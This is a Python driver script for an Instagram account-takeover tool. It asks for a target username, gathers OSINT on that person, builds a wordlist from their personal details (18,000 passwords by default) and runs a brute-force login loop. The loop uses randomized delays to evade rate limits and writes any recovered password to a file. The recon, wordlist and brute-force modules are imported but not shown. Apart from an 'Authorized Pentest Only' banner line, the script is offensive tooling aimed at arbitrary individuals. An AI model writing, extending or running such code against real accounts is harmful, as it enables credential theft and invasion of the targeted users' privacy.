#!/usr/bin/env python3
import sys
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm

from modules.recon import Recon
from modules.passgen import PassGen
from modules.brute import BruteForce

console = Console()

BANNER = """
[bold cyan]
   ██████╗ █████╗ ███╗   ███╗ ██████╗ ██████╗ ██████╗  ██████╗
  ██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗
  ██║     ███████║██╔████╔██║██║   ██║██████╔╝██████╔╝██║   ██║
  ██║     ██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██╔══██╗██║   ██║
  ╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝
[/bold cyan]
[bold white] Instagram OSINT + Smart Wordlist + Brute Force[/bold white]
[dim] Linux / Termux | Authorized Pentest Only[/dim]
"""


def main():
    console.print(BANNER)

    username = Prompt.ask("[bold cyan]📌 Enter target Instagram username[/bold cyan]").strip().lstrip("@")
    if not username:
        console.print("[red]No username[/red]")
        sys.exit(1)

    console.print(f"\n[bold green]🎯 Target: @{username}[/bold green]\n")
    console.print("[bold yellow]Choose mode:[/bold yellow]")
    console.print("  [1] Recon only")
    console.print("  [2] Generate wordlist only")
    console.print("  [3] Recon + Wordlist")
    console.print("  [4] Full: Recon + Wordlist + Brute Force")
    console.print("  [5] Brute Force with existing wordlist")

    choice = Prompt.ask("Choice", choices=["1", "2", "3", "4", "5"], default="4")

    recon_data = {}
    passwords = []
    wordlist_path = None

    # Phase 1: Recon
    if choice in {"1", "3", "4"}:
        console.print("\n[bold]═══ PHASE 1: RECON ═══[/bold]")
        r = Recon(username)
        recon_data = r.gather()
        r.display()
        r.export()
        if choice == "1":
            return

    # Phase 2: Wordlist
    if choice in {"2", "3", "4"}:
        console.print("\n[bold]═══ PHASE 2: PASSWORD GENERATION ═══[/bold]")
        pg = PassGen()
        info = pg.ask_personal_info()
        # seed generator with recon keywords automatically
        if recon_data:
            info["nickname"] = info.get("nickname") or username
            extra = info.get("extra", "")
            kws = ",".join(recon_data.get("keywords", [])[:15])
            info["extra"] = ",".join(x for x in [extra, kws, recon_data.get("full_name", "")] if x)
        count = int(Prompt.ask("How many passwords", default="18000"))
        passwords = pg.generate(info, username=username, target=count)
        wordlist_path = pg.save(passwords, username)
        if choice in {"2", "3"}:
            return

    # Phase 3: Brute
    if choice in {"4", "5"}:
        console.print("\n[bold]═══ PHASE 3: BRUTE FORCE LOGIN ═══[/bold]")
        if choice == "5":
            wordlist_path = Prompt.ask("Wordlist path")
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [ln.strip() for ln in f if ln.strip()]

        console.print(f"[*] Target: [cyan]{username}[/cyan]")
        console.print(f"[*] Total passwords: [green]{len(passwords)}[/green]")
        if not Confirm.ask("Start brute force? (Y/N)", default=False):
            console.print("[yellow]Cancelled[/yellow]")
            return

        engine = BruteForce(username, passwords, delay_min=3.0, delay_max=5.0)
        found = engine.run()
        if found:
            with open(f"FOUND_{username}.txt", "w") as f:
                f.write(f"{username}:{found}\n")
            console.print(f"[bold green]Saved to FOUND_{username}.txt[/bold green]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]Stopped by user[/yellow]")
        sys.exit(0)
